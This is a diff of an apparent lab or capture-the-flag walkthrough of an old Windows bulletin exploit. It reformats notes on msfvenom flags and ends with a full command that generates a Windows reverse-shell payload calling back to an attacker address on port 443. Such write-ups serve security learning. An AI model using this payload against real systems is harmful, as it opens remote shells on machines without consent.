@@ -8,14 +8,21 @@ https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2008/ms08-0
 
 ### Shellcode Generation
 
-To make the shellcode, I’ll use msfvenom. I’ll copy the bad characters list (-b) from the examples in the exploit code. I’ll use the following parameters:
+To make the shellcode, We will use `msfvenom`. 
 
-    -p windows/shell_reverse_tcp - This will connect back to me with a shell. Because I used shell_reverse_tcp it is unstaged, meaning the entire shell is in this code, and I can catch the callback with nc. Had I used shell/reverse_tcp, that would be a staged payload, and I’d need to use Metasploits exploit/multi/handler to get the callback.
-    LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread - defining the variables for the payload - my ip, the port, and how to exit.
-    -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" - The bad characters not to use. I got this from the comments in the python code.
-    -f py - Output in python format. The examples use c format, and just pasted it in slightly differently. Either will work.
-    -v shellcode - Have the code set the variable shellcode, instead of the default, buf. I want this to match what it’s called in the code I’m using.
-    -a x86 and --platform windows - Describing the environment I’m attacking.
+```
+-p windows/shell_reverse_tcp - This will connect back to me with a shell.
+    
+LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread - defining the variables for the payload - my ip, the port, and how to exit.
+
+-b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" - The bad characters not to use.
+
+-f py - Output in python format.
+
+-v shellcode - Have the code set the variable shellcode, instead of the default, buf. I want this to match what it’s called in the code I’m using.
+
+-a x86 and --platform windows - Describing the environment I’m attacking.
+```
 
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
